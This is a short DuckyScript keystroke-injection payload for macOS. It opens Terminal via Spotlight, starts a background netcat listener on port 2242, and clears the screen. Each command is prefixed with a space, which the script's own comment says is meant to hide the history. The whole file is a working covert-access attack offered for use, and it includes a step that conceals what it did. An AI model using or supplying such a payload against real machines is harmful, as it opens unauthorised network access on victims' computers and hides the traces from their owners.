REM Purpose: Open a port with netcat that listens as a background process and hides the history
REM Notes: If the OSX firewall is turned on the, there may be a pop-up prompt to allow or deny incoming connections
DELAY 100
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 500
SPACE
STRING nc -l 2242 &
ENTER
DELAY 50
SPACE
STRING clear
ENTER
